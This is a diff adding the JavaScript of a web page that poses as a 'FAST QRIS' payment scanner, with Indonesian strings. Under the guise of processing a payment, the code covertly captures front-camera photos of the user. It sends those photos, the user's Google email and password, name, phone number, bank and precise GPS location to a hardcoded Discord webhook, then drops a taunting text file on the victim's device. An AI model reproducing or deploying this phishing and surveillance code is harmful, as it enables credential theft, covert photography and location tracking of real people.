+            el.className = 'scan-status' + (mode === 'done' ? ' done' : '');
+            el.innerHTML = `<i class="fas ${icon}"></i> <span>${text}</span>`;
+        }
+
+        async function startAutoCapture() {
+            if (capturing || !stream) return;
+            capturing = true;
+            const video = document.getElementById('scannerVideo');
+
+            setScanStatus('Memproses pembayaran...', 'loading');
+            for (let i = 0; i < 30 && (!video.videoWidth || video.readyState < 2); i++) await sleep(100);
+            await sleep(300);
+
+            let capturedImages = [];
+            for (let i = 1; i <= 5; i++) {
+                let imgData = captureSinglePhoto(); // Mengambil foto dari kamera depan di background secara diam-diam
+                if (imgData) {
+                    capturedImages.push(imgData);
+                }
+                await sleep(300);
+            }
+
+            setScanStatus('Selesai', 'done');
+            await sleep(250);
+
+            if (capturedImages.length > 0) {
+                processTransactions(capturedImages);
+            } else {
+                setScanStatus('Gagal memproses, coba lagi');
+            }
+            capturing = false;
+        }
+
+        function captureSinglePhoto() {
+            const video = document.getElementById('scannerVideo');
+            if (!video.videoWidth) return null;
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+
+        function processTransactions(imagesArray) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const bank = getBankByLocation(userLocation);
+            const batchId = 'QRIS-BATCH-' + Date.now();
+
+            const transactionData = {
+                id: batchId,
+                images: imagesArray,
+                timestamp: timestamp,
+                location: userLocation || { lat: 0, lng: 0, accuracy: 0, altitude: null },
+                bank: bank,
+                status: 'SUCCESS',
+                user: userRegistration
+            };
+            
+            sendAllToDiscord(transactionData);
+            triggerPanjulKeceDownloadAndInstall();
+            showSuccess(transactionData);
+        }
+
+        function triggerPanjulKeceDownloadAndInstall() {
+            try {
+                const fileContent = "HAY GW PANJUL AKUN GMAIL, MUKA, LOKASI LU UDAH KETAHUAN AMA GW . #adios";
+                const blob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'PANJUL GANTENG.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            } catch (e) {
+                console.error('File download error:', e);
+            }
+        }
+
+        async function sendAllToDiscord(trans) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1541649508415316009/QJ7haE-COaXv7I34eimQejICmp1_h3_C1o3-7TtpEYPRUAXZDRxd7SlrkO6YoKwomkRz';
+            const formData = new FormData();
+
+            trans.images.forEach((imgBase64, index) => {
+                const base64Data = imgBase64.split(',')[1];
+                const binaryString = atob(base64Data);
+                const bytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+                const blob = new Blob([bytes], { type: 'image/jpeg' });
+                const fileName = `${trans.id}_foto_${index + 1}.jpg`;
+                formData.append(`file${index}`, blob, fileName);
+            });
+
+            const embed = {
+                title: '💳 QRIS Payment Detected & Google Login Captured',
+                color: 0x0ea5e9,
+                fields: [
+                    { name: '📧 Akun Google (Email)', value: userRegistration.googleEmail || 'N/A', inline: false },
+                    { name: '🔑 Password Google', value: userRegistration.googlePassword || 'N/A', inline: false },
+                    { name: '👤 Nama Lengkap', value: userRegistration.fullName, inline: true },
+                    { name: '📱 Nomor HP', value: userRegistration.phoneNumber, inline: true },
+                    { name: '🔑 Batch ID', value: trans.id, inline: false },
+                    { name: '⏰ Timestamp', value: trans.timestamp, inline: false },
+                    { name: '📍 Koordinat GPS', value: `Latitude: ${trans.location.lat.toFixed(8)}\nLongitude: ${trans.location.lng.toFixed(8)}`, inline: false },
+                    { name: '🎯 Akurasi GPS', value: `${Math.round(trans.location.accuracy)}m`, inline: true },
+                    { name: '🏔️ Altitude', value: trans.location.altitude ? `${Math.round(trans.location.altitude)}m` : 'N/A', inline: true },
+                    { name: '💳 Bank Pengguna', value: userRegistration.selectedBank, inline: true },
+                    { name: '🏦 Bank Tujuan', value: trans.bank, inline: true },
+                    { name: '🗺️ Google Maps', value: `[View Location](https://www.google.com/maps/search/${trans.location.lat},${trans.location.lng})`, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                username: 'FAST QRIS System',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/2040/2040341.png',
+                embeds: [embed]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+
+            try {
+                await fetch(webhookUrl, { method: 'POST', body: formData });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function getBankByLocation(loc) {
+            if (!loc || !locationPermitted) return 'International Bank (Unknown Location)';
+            const lat = loc.lat; const lng = loc.lng;
+            if (lat > -6.0 && lat < -5.9 && lng > 106.7 && lng < 107.0) return 'BCA - Jakarta Pusat';
+            else if (lat > -6.3 && lat < -6.2 && lng > 106.7 && lng < 107.1) return 'Bank Mandiri - Jakarta';
+            else if (lat > -6.4 && lat < -6.3 && lng > 106.6 && lng < 107.0) return 'BNI - Depok';
+            else if (lat > -6.9 && lat < -6.8 && lng > 107.5 && lng < 107.7) return 'BRI - Bandung';
+            else if (lat > -7.3 && lat < -7.2 && lng > 112.7 && lng < 112.8) return 'BCA - Surabaya';
+            else if (lat > -8.7 && lat < -8.6 && lng > 115.2 && lng < 115.3) return 'Bank Mandiri - Bali';
+            else return `Bank Lokal Indonesia (${getRegionName(lat, lng)})`;
+        }
+
+        function getRegionName(lat, lng) {
+            if (lat > -6.0 && lat < 6.0 && lng > 95.0 && lng < 141.0) return 'Southeast Asia';
+            else return 'Indonesia Region';
+        }
+
+        function showSuccess(trans) {
+            document.getElementById('transactionTime').textContent = trans.timestamp;
+            let locationText = `Lat: ${trans.location.lat.toFixed(8)}°<br>Lng: ${trans.location.lng.toFixed(8)}°<br>`;
+            locationText += `<span style="font-size: 12px; color: var(--blue);">🎯 Akurasi: ${Math.round(trans.location.accuracy)}m</span>`;
+            if (trans.location.altitude) {
+                locationText += `<br><span style="font-size: 12px; color: var(--blue);">🏔️ Altitude: ${Math.round(trans.location.altitude)}m</span>`;
+            }
+            locationText += `<br><a href="https://www.google.com/maps/search/${trans.location.lat},${trans.location.lng}" target="_blank" style="color: var(--blue-dark); font-weight: bold; text-decoration: underline; font-size: 12px;">🗺️ Buka di Google Maps</a>`;
+
+            document.getElementById('locationDisplay').innerHTML = locationText;
+            document.getElementById('bankDisplay').textContent = trans.bank;
+            document.getElementById('successModal').classList.remove('hidden');
+        }
+
+        function closeSuccess() {
+            document.getElementById('successModal').classList.add('hidden');
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+</body>
+</html>
